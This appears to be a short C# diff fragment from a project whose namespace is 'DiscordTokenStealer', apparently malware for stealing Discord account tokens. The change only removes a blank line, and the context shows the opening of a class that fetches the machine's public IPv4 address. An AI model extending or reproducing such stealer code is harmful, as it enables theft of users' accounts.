@@ -3,7 +3,6 @@ using System.Net.Sockets;
 using System.Net.NetworkInformation;
 
 namespace DiscordTokenStealer;
-
 public static class IPInfo
 {
     private static async Task<IPAddress> GetPublicIPv4()
